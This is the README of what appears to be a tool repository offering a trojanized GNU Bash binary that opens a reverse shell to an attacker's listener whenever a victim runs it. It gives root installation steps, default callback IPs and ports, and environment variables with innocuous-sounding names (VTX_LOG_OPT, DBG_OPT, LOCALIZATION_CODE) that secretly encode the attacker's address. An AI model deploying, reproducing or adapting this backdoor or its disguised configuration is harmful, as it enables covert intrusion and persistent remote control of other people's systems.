Modified Bash binary designed to throw reverse shells quickly and often. Configurable through environment variables.

Installation:

Run setup.py (requires root privileges)

Usage:

Simply open up a listener on the port that you designate.
When the victim uses the trojanized bash it will attempt to create a reverse shell.

Default port value: 1410
Default port configured by setup script: 1678
Default IP value: 10.0.4.12
Default IP configured by setup script: 10.0.4.10

Modifications:

Change the following environment variables in either the setup.sh script on on the victim machine.

export VTX_LOG_OPT="10"             ; first octet
export DBG_OPT="0"                  ; second octet
export VTX_SESSION_ID="4"           ; third octet
export VTX_VERSION="10"             ; fourth octet
export LOCALIZATION_CODE="1678"     ; port number


Notes:
the bash binary in this repo is the compiled version including modifications.
If you would like to try making your own modifications, you will need to clone the
official bash repo and work from there. One of the modified files for this project
is included (cd.def), however the complete process of making changes to all necessary files
and compiliation of the project is for you to discover.

Official GNU Bourne-Again Shell Git Repository: https://git.savannah.gnu.org/git/bash.git
